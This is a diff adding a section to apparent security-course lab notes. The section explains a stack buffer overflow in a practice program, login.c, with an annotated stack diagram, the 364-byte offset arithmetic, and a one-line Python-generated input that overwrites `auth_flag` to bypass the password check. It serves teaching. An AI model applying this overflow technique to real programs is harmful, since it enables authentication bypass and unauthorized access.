@@ -10,7 +10,43 @@ xx = (team_member NUID % 512)
 
 ![[Pasted image 20260401093533.png]]
 
-.
+## Part 1 — login.c (Simple Overflow)
+
+**Goal:** Get `auth_flag = 1` without knowing the password.
+
+**Stack layout inside `check_authentication`:**
+
+```
+LOW ADDRESS
+┌──────────────────┐ 0x7fffffffeaa0  ← username_buffer[16]
+│ username_buffer  │
+├──────────────────┤ 0x7fffffffeab0  ← team_var[333]
+│    team_var      │
+├──────────────────┤
+│                  │
+│   (333 bytes)    │
+│                  │
+├──────────────────┤ 0x7fffffffec0c  ← auth_flag (int)
+│    auth_flag     │
+└──────────────────┘
+HIGH ADDRESS
+```
+
+**The math:**
+
+```
+0x7fffffffec0c - 0x7fffffffeaa0 = 364 bytes
+```
+
+So if you write 364 bytes into `username_buffer` (which only holds 16), you reach `auth_flag`. The 365th byte overwrites it with a non-zero value → access granted.
+
+**The exploit:**
+
+bash
+
+```bash
+./login `python -c "print('A'*364 + '\x01')"` password
+```.
 
 
 
